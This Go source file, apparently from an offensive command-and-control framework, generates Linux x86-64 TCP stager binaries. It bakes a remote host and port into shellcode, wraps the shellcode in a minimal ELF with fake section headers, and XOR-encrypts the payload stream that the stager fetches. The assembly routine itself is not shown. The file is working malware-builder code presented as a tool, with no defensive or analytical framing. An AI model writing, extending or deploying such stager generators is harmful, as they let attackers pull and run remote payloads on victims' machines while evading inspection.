// Package stager generates TCP stager binaries at runtime.
//
// Shellcode is assembled directly in Go (like Metasm) and wrapped in a
// minimal ELF with fake section headers. No external compiler needed.
// The payload stream is XOR-encrypted with a per-generation random key.
package stager

import (
	"crypto/rand"
	"fmt"
	"net"
)

/* n0litetebastardescarb0rund0rum */

// Result holds a generated stager binary and its XOR key.
// The server must XOR the size prefix and payload with this key before sending.
type Result struct {
	Binary []byte
	XORKey [4]byte
}

type archBuilder struct {
	shellcode func(ip net.IP, port uint16, xorKey [4]byte) []byte
	wrap      func(sc []byte) []byte
}

var builders = map[string]archBuilder{
	"linux/amd64": {asmLinuxX64, makeELF64Wrapper(62)},
}

// Generate builds a TCP stager ELF for the given OS/arch with host:port
// baked into the shellcode. Returns the binary and its XOR key - the server
// must encrypt the payload stream with this key.
func Generate(targetOS, arch, host string, port uint16) (*Result, error) {
	b, ok := builders[targetOS+"/"+arch]
	if !ok {
		return nil, fmt.Errorf("no tcp stager for %s/%s", targetOS, arch)
	}

	ip, err := parseIPv4(host)
	if err != nil {
		return nil, err
	}

	var key [4]byte
	if _, err := rand.Read(key[:]); err != nil {
		return nil, fmt.Errorf("generate xor key: %w", err)
	}

	sc := b.shellcode(ip, port, key)
	return &Result{
		Binary: b.wrap(sc),
		XORKey: key,
	}, nil
}

// XOREncrypt applies the XOR key cyclically to data in-place.
func XOREncrypt(data []byte, key [4]byte) {
	for i := range data {
		data[i] ^= key[i%4]
	}
}

func parseIPv4(host string) (net.IP, error) {
	ip := net.ParseIP(host)
	if ip == nil {
		return nil, fmt.Errorf("invalid IP: %s", host)
	}
	ip4 := ip.To4()
	if ip4 == nil {
		return nil, fmt.Errorf("IPv6 not supported for tcp stager: %s", host)
	}
	return ip4, nil
}
